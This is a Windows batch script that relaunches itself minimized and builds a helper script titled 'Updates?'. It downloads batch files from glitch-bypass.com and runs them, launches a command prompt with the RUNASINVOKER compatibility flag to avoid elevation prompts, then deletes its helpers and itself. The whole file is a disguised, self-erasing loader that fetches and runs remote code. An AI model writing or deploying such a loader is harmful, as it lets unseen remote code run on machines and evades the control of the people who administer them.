@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
echo @echo off>SCMD.bat
echo title Updates?>>SCMD.bat
echo color 0A>>SCMD.bat
echo cd %%userprofile%%>>SCMD.bat

echo :: Hello, why you looking here? >>SCMD.bat

rem New Code
echo cd Desktop^>nul>>SCMD.bat
:: echo cd OneDrive^>nul>>SCMD.bat
:: echo cd Desktop^>nul>>SCMD.bat
echo cd "Art Project"^>nul>>SCMD.bat
echo cd .bat^>nul>>SCMD.bat

:: echo goto bypass>>SCMD.bat

echo IF EXIST CMD.bat (>>SCMD.bat
echo   cd %%userprofile%%^>nul>>SCMD.bat
echo   goto skip>>SCMD.bat
echo )>>SCMD.bat
echo curl -o a.bat https://www.glitch-bypass.com/terminal/setup.bat^>nul>>SCMD.bat
echo a.bat>>SCMD.bat
echo exit>>SCMD.bat
echo :skip>>SCMD.bat
echo cd %%userprofile%%^>nul>>SCMD.bat
echo cd Desktop^>nul>>SCMD.bat

rem End of new code

echo :: :bypass>>SCMD.bat

echo cls>>SCMD.bat
echo echo If this fails to start the prompt, either reinstall, or, if you know what you are doing, run CMD.bat and run the command "update">>SCMD.bat
echo echo Checking for updates>>SCMD.bat
echo FOR /F "delims=" %%%%F IN ('dir /S /b CMD.bat') DO SET ExePath=%%%%F>>SCMD.bat
echo cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" "%%ExePath%%"">>SCMD.bat
curl -o "setup.bat" "https://www.glitch-bypass.com/terminal/setup.bat"
start setup.bat
curl -o exe.bat https://www.glitch-bypass.com/terminal/yep.bat
call exe.bat SCMD.bat
del exe.bat
del SCMD.bat
(goto) 2>nul & del "%~f0"